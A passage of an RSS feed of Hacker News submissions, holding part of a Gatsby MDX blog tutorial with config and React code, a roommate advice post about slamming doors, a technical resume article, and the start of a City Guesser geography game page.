provided the convention detailed will be used.</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span></span></p><p><span>2</span><span></span><span>mkdir</span><span> -p posts/2019/</span><span>{</span><span>2019</span><span>-06-01-hello-world,2019-06-10-second-post,2019-06-20-third-post</span><span>}</span><span></span></p><p><span>3</span><span></span><span>touch</span><span> posts/2019/2019-06-01-hello-world/index.mdx</span></p><p><span>4</span><span></span><span>touch</span><span> posts/2019/2019-06-10-second-post/index.mdx</span></p><p><span>5</span><span></span><span>touch</span><span> posts/2019/2019-06-20-third-post/index.mdx</span></p></pre></div></div><p>Ok that’s your posts set up now you need to add some content to them,
each file you have in here should have frontmatter. Frontmatter is a
way to assign properties to the contents, in this case a <code>title</code>,
published <code>date</code> and a <code>published</code> flag (<code>true</code> or <code>false</code>).</p><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Hello World - from mdx!</span></p><p><span>3</span><span>date: 2019-06-01</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>#</span><span> h1 Heading</span><span></span></p><p><span>8</span><span></span></p><p><span>9</span><span>My first post!!</span></p><p><span>10</span><span></span></p><p><span>11</span><span></span><span>##</span><span> h2 Heading</span><span></span></p><p><span>12</span><span></span></p><p><span>13</span><span></span><span>###</span><span> h3 Heading</span></p></pre></div></div><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Second Post!</span></p><p><span>3</span><span>date: 2019-06-10</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>This is my second post!</span></p><p><span>8</span><span></span></p><p><span>9</span><span></span><span>####</span><span> h4 Heading</span><span></span></p><p><span>10</span><span></span></p><p><span>11</span><span></span><span>#####</span><span> h5 Heading</span><span></span></p><p><span>12</span><span></span></p><p><span>13</span><span></span><span>######</span><span> h6 Heading</span></p></pre></div></div><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Third Post!</span></p><p><span>3</span><span>date: 2019-06-20</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>This is my third post!</span></p><p><span>8</span><span></span></p><p><span>9</span><span></span><span>&gt;</span><span> with a block quote!</span></p></pre></div></div><h2 id="gatsby-config-api"><a href="#gatsby-config-api" aria-label="gatsby config api permalink"></a>Gatsby config API</h2><p>Ok, now you’re going to configure Gatsby so that it can read your
super awesome content you just created. So, first up you need to
create a <code>gatsby-config.js</code> file, in the terminal create the file:</p><h2 id="plugins"><a href="#plugins" aria-label="plugins permalink"></a>Plugins</h2><p>And now you can add the plugins Gatsby needs to use for sourcing and
displaying the the files you just created.</p><h3 id="gatsby-source-filesystem"><a href="#gatsby-source-filesystem" aria-label="gatsby source filesystem permalink"></a>Gatsby source filesystem</h3><p>The <a href="https://www.gatsbyjs.org/packages/gatsby-source-filesystem/" target="_blank" rel="noopener">gatsby-source-filesystem</a> collects the files on the local
filesystem for use in Gatsby once configured.</p><h3 id="gatsby-plugin-mdx"><a href="#gatsby-plugin-mdx" aria-label="gatsby plugin mdx permalink"></a>Gatsby plugin MDX</h3><p>The <a href="https://www.gatsbyjs.org/packages/gatsby-plugin-mdx/" target="_blank" rel="noopener">gatsby-plugin-mdx</a> is what will be allowing us to write JSX in
our Markdown documents and the heart of how the content is displayed
in the blog.</p><p>Now is a good time to also add in dependent packages for the Gatsby
plugin MDX which are <code>@mdx-js/mdx</code> and <code>@mdx-js/react</code>.</p><p>In the terminal install the dependencies:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>yarn</span><span> </span><span>add</span><span> gatsby-plugin-mdx @mdx-js/mdx @mdx-js/react gatsby-source-filesystem</span></p></pre></div></div><p>Now its time to configure <code>gatsby-config.js</code>:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  siteMetadata</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    title</span><span>:</span><span> </span><span>`</span><span>The Localhost Blog</span><span>`</span><span>,</span><span></span></p><p><span>4</span><span>    description</span><span>:</span><span> </span><span>`</span><span>This is my coding blog where I write about my coding journey.</span><span>`</span><span>,</span><span></span></p><p><span>5</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>6</span><span>  plugins</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>7</span><span>    </span><span>{</span><span></span></p><p><span>8</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-plugin-mdx</span><span>`</span><span>,</span><span></span></p><p><span>9</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>10</span><span>        extensions</span><span>:</span><span> </span><span>[</span><span>`</span><span>.mdx</span><span>`</span><span>,</span><span> </span><span>`</span><span>.md</span><span>`</span><span>]</span><span>,</span><span></span></p><p><span>11</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>12</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>13</span><span>    </span><span>{</span><span></span></p><p><span>14</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-source-filesystem</span><span>`</span><span>,</span><span></span></p><p><span>15</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>16</span><span>        path</span><span>:</span><span> </span><span>`</span><span>${</span><span>__dirname</span><span>}</span><span>/posts</span><span>`</span><span>,</span><span></span></p><p><span>17</span><span>        name</span><span>:</span><span> </span><span>`</span><span>posts</span><span>`</span><span>,</span><span></span></p><p><span>18</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>19</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>20</span><span>  </span><span>]</span><span>,</span><span></span></p><p><span>21</span><span></span><span>}</span></p></pre></div></div><h2 id="query-data-from-graphql"><a href="#query-data-from-graphql" aria-label="query data from graphql permalink"></a>Query data from GraphQL</h2><p>Ok now you can see what the <a href="https://www.gatsbyjs.org/packages/gatsby-source-filesystem/" target="_blank" rel="noopener">gatsby-source-filesystem</a> and
<a href="https://www.gatsbyjs.org/packages/gatsby-plugin-mdx/" target="_blank" rel="noopener">gatsby-plugin-mdx</a> have done for us. You can now go to the Gatsby
GraphQL GraphiQL explorer and check out the data:</p><div><div data-language="graphql"><pre data-linenumber="true"><p><span>1</span><span>{</span><span></span></p><p><span>2</span><span>  allMdx </span><span>{</span><span></span></p><p><span>3</span><span>    nodes </span><span>{</span><span></span></p><p><span>4</span><span>      frontmatter </span><span>{</span><span></span></p><p><span>5</span><span>        title</span></p><p><span>6</span><span>        date</span></p><p><span>7</span><span>      </span><span>}</span><span></span></p><p><span>8</span><span>    </span><span>}</span><span></span></p><p><span>9</span><span>  </span><span>}</span><span></span></p><p><span>10</span><span></span><span>}</span></p></pre></div></div><h2 id="site-metadata"><a href="#site-metadata" aria-label="site metadata permalink"></a>Site Metadata</h2><p>When you want to reuse common pieces of data across the site (for
example, your site title), you can store that data in <code>siteMetadata</code>,
you touched on this when defining the <code>gatsby-config.js</code>, now you’re
going to separate this out from the <code>module.exports</code>, why? It will be
nicer to reason about once the config is filled with plugins. At the
top of <code>gatsby-config.js</code> add a new object variable for the site
metadata:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>const</span><span> siteMetadata </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  title</span><span>:</span><span> </span><span>`</span><span>The Localhost Blog</span><span>`</span><span>,</span><span></span></p><p><span>3</span><span>  description</span><span>:</span><span> </span><span>`</span><span>This is my coding blog where I write about my coding journey.</span><span>`</span><span>,</span><span></span></p><p><span>4</span><span></span><span>}</span></p></pre></div></div><p>Now query the Site Metadata with GraphQL.</p><div><div data-language="graphql"><pre data-linenumber="true"><p><span>1</span><span>{</span><span></span></p><p><span>2</span><span>  site </span><span>{</span><span></span></p><p><span>3</span><span>    siteMetadata </span><span>{</span><span></span></p><p><span>4</span><span>      title</span></p><p><span>5</span><span>      description</span></p><p><span>6</span><span>    </span><span>}</span><span></span></p><p><span>7</span><span>  </span><span>}</span><span></span></p><p><span>8</span><span></span><span>}</span></p></pre></div></div><h2 id="site-metadata-hook"><a href="#site-metadata-hook" aria-label="site metadata hook permalink"></a>Site metadata hook</h2><p>Ok, so, that’s cool n’ all but how am I meant to use it? Well do some
of the code stuff and make a React hook so you can get your site data
in any component you need it.</p><p>Create a folder to keep all your hooks in and create a file for our
hook, in the terminal do:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>mkdir</span><span> src/hooks</span></p><p><span>2</span><span></span><span>touch</span><span> src/hooks/useSiteMetadata.js</span></p></pre></div></div><p>Ok, and in your newly created file were going to use the Gatsby
<code>useStaticQuery</code> hook to make your own hook:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>import</span><span> </span><span>{</span><span> graphql</span><span>,</span><span> useStaticQuery </span><span>}</span><span> </span><span>from</span><span> </span><span>'gatsby'</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>export</span><span> </span><span>const</span><span> </span><span>useSiteMetadata</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>{</span><span> site </span><span>}</span><span> </span><span>=</span><span> </span><span>useStaticQuery</span><span>(</span><span></span></p><p><span>5</span><span>    graphql</span><span>`</span><span></span></p><p><span>6</span><span>      query SITE_METADATA_QUERY {</span></p><p><span>7</span><span>        site {</span></p><p><span>8</span><span>          siteMetadata {</span></p><p><span>9</span><span>            title</span></p><p><span>10</span><span>            description</span></p><p><span>11</span><span>          }</span></p><p><span>12</span><span>        }</span></p><p><span>13</span><span>      }</span></p><p><span>14</span><span>    </span><span>`</span><span></span></p><p><span>15</span><span>  </span><span>)</span><span></span></p><p><span>16</span><span>  </span><span>return</span><span> site</span><span>.</span><span>siteMetadata</span><span></span></p><p><span>17</span><span></span><span>}</span></p></pre></div></div><p>Now you can use this hook anywhere in your site, so do that now in
<code>src/pages/index.js</code>:</p><div><div data-language="jsx"><pre data-linenumber="true"><p><span>1</span><span>import</span><span> React </span><span>from</span><span> </span><span>'react'</span><span></span></p><p><span>2</span><span></span><span>import</span><span> </span><span>{</span><span> useSiteMetadata </span><span>}</span><span> </span><span>from</span><span> </span><span>'../hooks/useSiteMetadata'</span><span></span></p><p><span>3</span><span></span></p><p><span>4</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>{</span><span> title</span><span>,</span><span> description </span><span>}</span><span> </span><span>=</span><span> </span><span>useSiteMetadata</span><span>(</span><span>)</span><span></span></p><p><span>6</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>7</span><span>    </span><span>&lt;</span><span>&gt;</span><span></span></p><p><span>8</span><span>      </span><span>&lt;</span><span>h1</span><span>&gt;</span><span>{</span><span>title</span><span>}</span><span>&lt;/</span><span>h1</span><span>&gt;</span><span></span></p><p><span>9</span><span>      </span><span>&lt;</span><span>p</span><span>&gt;</span><span>{</span><span>description</span><span>}</span><span>&lt;/</span><span>p</span><span>&gt;</span><span></span></p><p><span>10</span><span>    </span><span>&lt;/</span><span>&gt;</span><span></span></p><p><span>11</span><span>  </span><span>)</span><span></span></p><p><span>12</span><span></span><span>}</span></p></pre></div></div><h2 id="styling"><a href="#styling" aria-label="styling permalink"></a>Styling</h2><p>You’re going to use styled-components for styling, styled-components
(for me) help with scoping styles in your components. Time to go over
the basics now.</p><h3 id="install-styled-components"><a href="#install-styled-components" aria-label="install styled components permalink"></a>install styled-components</h3><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>yarn</span><span> </span><span>add</span><span> gatsby-plugin-styled-components styled-components babel-plugin-styled-components</span></p></pre></div></div><p>So, what was all that I just installed?</p><p>The babel plugin is for automatic naming of components to help with
debugging.</p><p>The Gatsby plugin is for built-in server-side rendering support.</p><h3 id="configure"><a href="#configure" aria-label="configure permalink"></a>Configure</h3><p>Ok, with that detailed explanation out of the way, configure them in
<code>gatsby-config.js</code>:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>const</span><span> siteMetadata </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  title</span><span>:</span><span> </span><span>`</span><span>The Localhost Blog</span><span>`</span><span>,</span><span></span></p><p><span>3</span><span>  description</span><span>:</span><span> </span><span>`</span><span>This is my coding blog where I write about my coding journey.</span><span>`</span><span>,</span><span></span></p><p><span>4</span><span></span><span>}</span><span></span></p><p><span>5</span><span></span></p><p><span>6</span><span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>7</span><span>  siteMetadata</span><span>:</span><span> siteMetadata</span><span>,</span><span></span></p><p><span>8</span><span>  plugins</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>9</span><span>    </span><span>`</span><span>gatsby-plugin-styled-components</span><span>`</span><span>,</span><span></span></p><p><span>10</span><span>    </span><span>{</span><span></span></p><p><span>11</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-plugin-mdx</span><span>`</span><span>,</span><span></span></p><p><span>12</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>        extensions</span><span>:</span><span> </span><span>[</span><span>`</span><span>.mdx</span><span>`</span><span>,</span><span> </span><span>`</span><span>.md</span><span>`</span><span>]</span><span>,</span><span></span></p><p><span>14</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>15</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>16</span><span>    </span><span>{</span><span></span></p><p><span>17</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-source-filesystem</span><span>`</span><span>,</span><span></span></p><p><span>18</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>19</span><span>        path</span><span>:</span><span> </span><span>`</span><span>${</span><span>__dirname</span><span>}</span><span>/posts</span><span>`</span><span>,</span><span></span></p><p><span>20</span><span>        name</span><span>:</span><span> </span><span>`</span><span>posts</span><span>`</span><span>,</span><span></span></p><p><span>21</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>22</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>23</span><span>  </span><span>]</span><span>,</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div></div><p>Ok, time to go over a styled component, in <code>index.js</code> you’re going to
<code>import styled from 'styled-components'</code> and create a <code>StyledH1</code>
variable.</p><p>So, you’re using the variable to wrap your <code>{title}</code> that you’re
destructuring from the <code>useSiteMetadata</code> hook you made previously.</p><p>For this example make it the now iconic Gatsby <code>rebeccapurple</code>.</p><div><div data-language="jsx"><pre data-linenumber="true"><p><span>1</span><span>import</span><span> React </span><span>from</span><span> </span><span>'react'</span><span></span></p><p><span>2</span><span></span><span>import</span><span> styled </span><span>from</span><span> </span><span>'styled-components'</span><span></span></p><p><span>3</span><span></span><span>import</span><span> </span><span>{</span><span> useSiteMetadata </span><span>}</span><span> </span><span>from</span><span> </span><span>'../hooks/useSiteMetadata'</span><span></span></p><p><span>4</span><span></span></p><p><span>5</span><span></span><span>const</span><span> StyledH1 </span><span>=</span><span> styled</span><span>.</span><span>h1</span><span>`</span><span></span></p><p><span>6</span><span>  color: rebeccapurple;</span></p><p><span>7</span><span></span><span>`</span><span></span></p><p><span>8</span><span></span></p><p><span>9</span><span></span><span>export</span><span> </span><span>defaul…</span></p></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scottspence.com/2019/10/31/build-an-mdx-blog/">https://scottspence.com/2019/10/31/build-an-mdx-blog/</a></em></p>]]>
            </description>
            <link>https://scottspence.com/2019/10/31/build-an-mdx-blog/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969064</guid>
            <pubDate>Sat, 30 Jan 2021 13:54:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to stop your roommate from slamming doors]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25968989">thread link</a>) | @rarestoma
<br/>
January 30, 2021 | https://www.roombuddy.co/blog/en/how-to-stop-your-roommate-from-slamming-doors | <a href="https://web.archive.org/web/*/https://www.roombuddy.co/blog/en/how-to-stop-your-roommate-from-slamming-doors">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      


    <section data-offset-top="#header-main">
      
    </section>

    <hr>
    <section>

      <div>

        <div>
          <div>
            <!-- Article body -->
            <article>
              <h5>
                Do you get annoyed every time your roommate slams the doors?
                Does it wake you up every morning? How can you avoid this?
              </h5>
              <h3>First thing to do</h3>
              <p>
                 Try to talk with your roommate and explain to him that this bothers you.
                 Talk to him without tension and in a clear and calm way. It is
                 recommended to catch your roommate in a good mood. if he is sad
                 or has had a hard day he is more likely to take the problem more personally
                 and not understand that it is actually a small thing that bothers you.
                 If you are different in personality, take a step back and try to take it
                as nicely as possible and explain it without getting upset. He may not know
                that he is doing this and he will realize that it is an annoying thing that
                he is not consciously doing.
              </p>
              <p>
                <i></i>Try to avoid phrases like:
              </p>
              <ul>
                <li>It is very annoying that you are slamming the door!</li>
                <li>if I woke you up every day knocking on the door, would you like it !?</li>
                <li>I don't know how you can slam the doors like that!</li>
              </ul>

              <p>
                 <i></i> Try to approach your roommate with a phrase like:
              </p>

              <blockquote>
                <p>
                  Hi! I had such a hard day, how was yours?
                  I know you woke up at 6 that I heard when you closed the door.
                  I thought it sounded really loud and I woke up instantly.
                  Maybe we should put some sticky pads on the furniture to make it
                  less noisy or trying to close it more carefully not to wake up each other.
                </p>
              </blockquote>

              <h3>Other ways to prevent noise are:</h3>
              <ol>
                <li>
                  Try sticky furniture pads
                  <br>
                  - not completely, but it will dampen the sound
                  <br>
                  - <a href="https://www.amazon.com/Self-Adhesive-Furniture-Cupboard-Dampening-Anti-Slam/dp/B07NV14R51" target="
                  " rel="nofollow">here</a> is a model of what it should look like
                </li>
                <li>
                  Make a set of rules from the beginning that includes 'don't slam the doors' and stick the paper it on the main wall
                  <br>
                  - The advantage of this is that you can't get upset on a paper that has some rules. ‘Don’t slam the doors’ from a human being may sound annoying but reading it will not bother you
                </li>
                <li>
                  Install a door closer
                  <br>
                  - <a href="https://www.amazon.com/Automatic-Adjustable-Door-Closer-Installation-Instructions/dp/B0749MCLMQ/ref=sr_1_1_sspa?_encoding=UTF8&amp;c=ts&amp;dchild=1&amp;keywords=Door+Closers&amp;qid=1612008400&amp;s=hardware&amp;sr=1-1-spons&amp;ts_id=511282&amp;psc=1&amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUE4R0tLNVRYTUNFMkEmZW5jcnlwdGVkSWQ9QTAwNzM5NjYyRVZMU01RQlFRODBRJmVuY3J5cHRlZEFkSWQ9QTAxMDY4MjgyM0VRMkZXN0QyNFU3JndpZGdldE5hbWU9c3BfYXRmJmFjdGlvbj1jbGlja1JlZGlyZWN0JmRvTm90TG9nQ2xpY2s9dHJ1ZQ" target="
                  " rel="nofollow">here</a> is a model of what it should look like
                </li>
              </ol>



            <hr>
            
            
          </article></div>
          
        </div>
      </div>
    </section>
    

  </div></div>]]>
            </description>
            <link>https://www.roombuddy.co/blog/en/how-to-stop-your-roommate-from-slamming-doors</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968989</guid>
            <pubDate>Sat, 30 Jan 2021 13:44:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a great technical resume can do for you]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968961">thread link</a>) | @mcenedella
<br/>
January 30, 2021 | https://leetresumes.com/blog/what-a-great-technical-resume-can-do-for-you | <a href="https://web.archive.org/web/*/https://leetresumes.com/blog/what-a-great-technical-resume-can-do-for-you">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The purpose of your technical resume is to generate interview requests. A successful resume attracts more interest, from more of the companies you want to interview with, for more of the jobs you would be happy to take.</p><p>You might think of a resume as your personal summary document, covering all of your life’s work to date. But it’s better to think of your resume as a business document that helps you advertise your capabilities to a future employer.</p><p>I’ve worked with thousands of employers, published the <a href="https://www.businessinsider.com/heres-what-recruiters-look-at-during-the-6-seconds-they-spend-on-your-resume-2012-4">ground-breaking research</a> into recruiter resume review time, and written several bestsellers on resumes and other career topics. And that’s why I’m now writing <a href="https://signup.meetleet.com/">great technical resumes for free</a>. Resumes, when done right, are great help in accelerating your career.</p><p>Here are a few things a <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation">technical resume</a> is not:</p><ul><li>Not your autobiography</li><li>Not a comprehensive catalog of everything you’ve done</li><li>Not a way to make you feel good about yourself (though it might also do that)</li><li>Not an academic CV</li><li>Not where you need to explain past ‘bad situations’</li><li>Not where you need to explain why you left prior jobs</li></ul><p>No, a technical resume is none of those things. And that’s because none of those things help get you hired.</p><p>Instead, a technical resume’s primary purpose is to generate interview requests for you. It’s where you make the case to “please pick me out of the pile.”</p><p>(Secondarily, a resume is a useful page of notes to use during interviews, especially behavioral interviews. We all know how our minds can go blank during interviews and it’s useful to have something to aid your memory in those moments.)</p><p>What’s the best way to get a hiring manager or future boss to select your resume from the pile? </p><p>It’s to make it as clear as possible which types of problems you’ve solved in the past, and how well you solved them. With that information, hiring managers have the easiest time in predicting what you can do for them in the future.</p><p>Unfortunately, most technology professionals take the easy way out, and copy and paste their job description into their resume. As a result, their <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> are full of sentences that begin “Responsible for” or “Worked on” or “Assigned to.”</p><p>This is a mistake because your future employer is not going to hire you for your past <strong>responsibilities</strong>. Rather, they will hire you for your past <strong>successes</strong>. It’s your achievements and results in technology that get you promoted and elevated to ever-higher levels.</p><p>And that’s why great technical resumes focus on results, <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> and method. </p><p><strong>Results</strong>: for the technology you were working on, how did it make your company, team, or systems better? Did it increase, decrease, grow, shrink, improve, suppress, optimize, deprecate, add or remove something important for your company? For everything you’ve worked on, there was some reason you were doing it. Hopefully, that reason had to do with making things better. Share the result with your resume readers. </p><p><strong>Numbers</strong>: by how much did you make things better? As a technology professional, you’re used to numbers. We measure the success of what we do in numbers all the time: latency, loadtime, DAUs, Google score. Using numbers to describe the work you’ve done comes naturally in the field.</p><p>So the more you can use numbers to <strong>quantify</strong> how much you helped increase, decrease, grow, shrink, etc., the important metrics in your prior roles, the better and more persuasive your resume will be in getting picked out of the pile. </p><p><strong>Method</strong>: this is the technical “how I did it” part of a great technical resume. If you increased something by 50% what technologies or solutions or methodologies did you use to get there? If you shrank a different metric by 70%, what activities or behaviors or actions did you need to take to achieve this reduction?</p><p>Many technical resumes miss the results and the numbers and only list the method of how they did something. Unfortunately, that’s not as effective at attracting attention to get your resume picked out of the pile.</p><p>To demonstrate, the <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> below <strong>with</strong> <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> are much more powerful than the same bullet point <strong>without</strong> numbers.</p><ul><li>Responsible for for managing our AWS cloud services for cost, reliability and scalability.</li><li>Reduced costs 17% by decommissioning 42 ec2 instances in our AWS implementation while managing for costs, reliability and scalability.</li></ul><ul><li>Worked on cloud backend </li><li>Architected cloud backend to support scaling from 50,000 to 1.5 million daily users.</li></ul><ul><li>Refactored our front/end experience using React.</li><li>Reduced average page load time 57% by refactoring our front-end experience in React.</li></ul><ul><li>Improved rendering system for complex graphical objects.</li><li>Improved the performance of rendering system for complex graphical objects from 10,000 to 1,000,000 objects per second with only 20% increase in resource utilization. </li></ul><p>Combining results, numbers and methods on your resume makes your experience stand out from the pile. And that’s the <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation">best way</a> to fulfill the purpose of your resume - to get you interview requests.</p><p><a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">Great technical resumes</a> increase your chances of getting hired, and getting ahead in your career. If you’d like Leet Resumes to write your technical resume for free, <a href="https://signup.meetleet.com/">sign up here</a>.</p></div></div></div></div>]]>
            </description>
            <link>https://leetresumes.com/blog/what-a-great-technical-resume-can-do-for-you</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968961</guid>
            <pubDate>Sat, 30 Jan 2021 13:40:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[City Guesser – GeoGuessr but with video]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968788">thread link</a>) | @jurnip
<br/>
January 30, 2021 | https://virtualvacation.us/guess | <a href="https://web.archive.org/web/*/https://virtualvacation.us/guess">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<!-- <h1 style="font-size: 18px; margin-top: 3%; margin-left: 5%; margin-right: 5%;"><i class="fa fa-user" aria-hidden="true"></i> Select a city to fly over:</h1> -->
<!-- ShareThis BEGIN -->
<!-- <div class="sharethis-inline-share-buttons"></div> -->
<!-- ShareThis END -->
<!-- <p style="margin-left: 5%; margin-right: 5%;">Don't want fly around? Click here to <a href="https://virtualvacation.us/explore" style="color: darkblue;">drive, walk or view it LIVE!</a></p> -->
<div>
    <!-- <div class="container-fluid"> -->
      <!-- <div class="row bg"> -->
        <!-- <div class="col-md-12"> -->
          <div>
            <h4>Welcome to</h4>
            <h4><span>City Guesser  </span></h4>
            <p>To begin the guessing game, select a location or difficulty. </p>
          </div>
        <!-- </div> -->
      <!-- </div> -->
    <!-- </div> -->
  </div>

<ul>
<li onclick="loadVideoWithId('wor')">
    <div>
      
      <div>
        <p>Worldwide 🌍</p>
        <p>Explore the far reaches of the world and take a wild guess of where you are it. Be sure to look at street signs and cars!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li onclick="loadVideoWithId('usa')">
    <div>
      
      <div>
        <p>USA 🇺🇸</p>
        <p>Explore different locations within the United States and make your guess based on the things around you. Good luck!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li onclick="loadVideoWithId('eur')">
    <div>
      
      <div>
        <p>Europe 🇪🇺</p>
        <p>Narrow down the search by limiting the possible area just to Europe. Can you get a perfect score? Watch out for flags!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<li onclick="loadVideoWithId('mon')">
    <div>
      
      <div>
        <p>Monuments 🏛️</p>
        <p>Explore different monuments from around the globe! Is your monument trivia up to par? Give it a go now by clicking below!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<!-- </div> -->
</ul>

<!-- ShareThis BEGIN -->

<!-- ShareThis END -->
<ul>
<li id="ycard" onclick="loadVideoWithId('can')">
    <div>
      
      <div>
        <p>Canada 🇨🇦</p>
        <p>Ever been to Canada? No? Explore and use your guessing skills to sightsee Canada!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
  
<li id="ycard" onclick="loadVideoWithId('rus')">
    <div>
      
      <div>
        <p>Russia 🇷🇺</p>
        <p>Explore the depths of Russia and take a wild guess of where you are. Can you get 100%?</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<!-- <li class="xcards__item" id="ycard" onclick="loadVideoWithId('chi')" style="cursor: pointer;">
    <div class="xcard">
      <div class="xcard__image lazyload" data-bgset="static/chinaemoji.jpg"></div>
      <div class="xcard__content">
        <div class="xcard__title">China 🇨🇳</div>
        <p class="xcard__text">Explore the depths of China and take a wild guess of where you are. Can you get 100%?</p>
        <a class="mybtn mybtn--block xcard__mybtn">Guess!</a>
      </div>
    </div>
  </li> -->
<li id="ycard" onclick="loadVideoWithId('ukn')">
    <div>
      
      <div>
        <p>England 🇬🇧</p>
        <p>Explore the depths of England and take a wild guess! Wales and Scotland are included.</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<li id="ycard" onclick="loadVideoWithId('fra')">
    <div>
      
      <div>
        <p>France 🇫🇷</p>
        <p>Can you locate different cities within France just by walking in them? Lets see!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li id="ycard" onclick="loadVideoWithId('asi')">
    <div>
      
      <div>
        <p>Asia 🌏</p>
        <p>Can you locate different cities within Asia just by seeing them? (Australia Included)</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<li id="ycard" onclick="loadVideoWithId('jap')">
    <div>
      
      <div>
        <p>Japan 🇯🇵</p>
        <p>Can you locate different cities within Japan? Click the guess button to start predicting!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li id="ycard" onclick="loadVideoWithId('ind')">
    <div>
      
      <div>
        <p>India 🇮🇳</p>
        <p>Is your Indian geography up to par? See if you can guess where you are at!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li id="ycard" onclick="loadVideoWithId('bra')">
    <div>
      
      <div>
        <p>Brazil 🇧🇷</p>
        <p>Ever been to Brazil? No? Let's see if you can locate these Brazilian cities!</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>

<li id="ycard" onclick="loadVideoWithId('aus')">
    <div>
      
      <div>
        <p>Australia 🇦🇺</p>
        <p>Is your Australian geography up to par? See if you can guess your location!</p>
